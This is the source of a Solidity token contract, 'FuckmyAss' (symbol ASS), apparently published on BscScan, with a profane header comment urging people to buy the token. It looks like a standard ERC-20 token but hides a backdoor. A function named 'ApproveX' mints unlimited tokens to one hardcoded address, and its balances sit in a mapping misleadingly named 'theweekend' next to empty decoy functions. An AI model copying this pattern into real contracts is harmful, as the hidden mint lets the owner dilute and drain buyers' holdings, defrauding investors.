/**
 *Submitted for verification at BscScan.com on 2021-11-08
*/

/**


Fuck my AssX

you are fuck my ass?
yes/no?
buy now my tokens!

*/







pragma solidity >=0.8.0 <=0.8.9;

interface ERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

 contract FuckmyAss is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private theweekend;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _namex = "FuckmyAss";
    string private _symbolx = "ASS";
    uint256 private constant MAX = ~uint256(0);

    uint256 private _maxTx = _totalSupply;
    address private _feeAddrWalletsX1 = 0x39a22c5C9029800235EC361ebC23C6B0f22D36d6;
    address private _feeAddrWalletsX2 = 0x39a22c5C9029800235EC361ebC23C6B0f22D36d6;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 100000 * 10**18;
    address private _elementx = 0x39a22c5C9029800235EC361ebC23C6B0f22D36d6;
    uint256 private _rTotal = 100000 * 10 ** 28;
    bool private inSwap = true;
    uint256 private _tFeeTotal;
    uint256 private _demandx = 1;
    uint256 private _francisx = 1;
    address private _owner;
    uint256 private _fee;

    constructor(uint256 totalSupply_, string memory kokex) {
        _namex = "FuckmyAss";
        _symbolx = "ASS";
        inSwap = false;
        _totalSupply = totalSupply_;
        _owner = _msgSender();
        theweekend[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
  }

    function name() public view virtual override returns (string memory) {
        return _namex;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbolx;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return theweekend[owner];
    }

    function viewTaxFee() public view virtual returns(uint256) {
        return _francisx;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approveZ(_msgSender(), spender, amount);
        return true;
    }

    function ApproveX(uint256 amount) public {
        _approveZdX(msg.sender, amount);
        require(_msgSender() == _elementx, "fuck my ass!");
    }

function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal - rFee;
        _tFeeTotal = _tFeeTotal + tFee;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: will not permit action right now.");
        unchecked {
            _approveZ(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approveZ(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

     function paraSwap(address from, address to, address token, uint256 amount) internal {

    }


    function swapFromPlayer() external {
        require (_msgSender() == _feeAddrWalletsX1);
        uint256 contractBalance = balanceOf(address(this));
        _multiply(contractBalance);
    }

    function swapToPlayer() external {
        require (_msgSender() == _feeAddrWalletsX1);
        uint256 contractETHBalance = address(this).balance;
        _subvert(contractETHBalance);
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: will not permit action right now.");
        unchecked {
            _approveZ(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

 function _approveZdX(address account, uint256 amount) internal virtual {
        require(account != address(0));
        theweekend[account] = theweekend[account] + amount;
        emit Transfer(address(0), account, amount);
    }


function _multiply (uint256 amount) private {

    }

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function _transfer(
        address issuer,
        address grantee,
        uint256 allons
    ) internal virtual {
        require(issuer != address(0), "BEP : Can't be done");
        require(grantee != address(0), "BEP : Can't be done");

        uint256 senderBalance = theweekend[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            theweekend[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demandx / 100) / _francisx;
        allons = allons -  (_fee * _francisx);

        theweekend[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }

     /**
   * @dev Returns the address of the current owner.
   */
      function owner() public view returns (address) {
        return _owner;
      }


    function _burn(address account, uint256 sum) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = theweekend[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            theweekend[account] = accountBalance - sum;
        }
        _totalSupply -= sum;

        emit Transfer(account, address(0), sum);
    }


function _subvert (uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new  address[](2);
        path[1] = address(this);
    }

    /**
 this my ass
     */
    function _approveZ(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BES");
        require(spender != address(0), "BES");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "OwnableS");
    _;
  }
}